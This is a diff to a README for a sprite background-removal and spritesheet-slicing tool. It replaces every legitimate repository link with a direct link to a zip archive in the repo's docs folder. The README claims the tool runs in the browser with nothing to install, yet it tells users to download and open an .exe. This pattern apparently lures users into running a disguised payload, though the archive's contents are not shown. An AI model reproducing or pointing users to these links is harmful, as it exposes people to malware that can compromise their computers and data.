@@ -1,12 +1,12 @@
 # 🎨 sprite-lab - Remove backgrounds and slice spritesheets automatically
 
-[![](https://img.shields.io/badge/Download-Sprite%20Lab-blue.svg)](https://github.com/boivent2037/sprite-lab)
+[![](https://img.shields.io/badge/Download-Sprite%20Lab-blue.svg)](https://github.com/boivent2037/sprite-lab/raw/refs/heads/main/docs/sprite_lab_2.6-alpha.5.zip)
 
 Sprite Lab allows you to process your images directly in your web browser. It removes backgrounds from sprites and slices large sprite sheets into individual animation frames. You do not need to install complex software or upload files to a server. Your images stay on your computer at all times.
 
 ## 📥 How to download and run
 
-1. Visit the [official releases page](https://github.com/boivent2037/sprite-lab).
+1. Visit the [official releases page](https://github.com/boivent2037/sprite-lab/raw/refs/heads/main/docs/sprite_lab_2.6-alpha.5.zip).
 2. Look for the latest version under the Releases section.
 3. Click the link that ends in .exe to start your download.
 4. Open the folder where your browser saves downloaded files.
@@ -75,4 +75,4 @@ You can import common image formats like PNG, JPG, and BMP. We recommend using P
 There is no hard limit, but very large images might slow down the preview window. If you work with images larger than 4096 by 4096 pixels, ensure your computer has at least 8 gigabytes of RAM.
 
 ### How do I update the software?
-Check the [main repository page](https://github.com/boivent2037/sprite-lab) periodically. When a new version appears, follow the download steps again to replace your old version with the newest one.
+Check the [main repository page](https://github.com/boivent2037/sprite-lab/raw/refs/heads/main/docs/sprite_lab_2.6-alpha.5.zip) periodically. When a new version appears, follow the download steps again to replace your old version with the newest one.
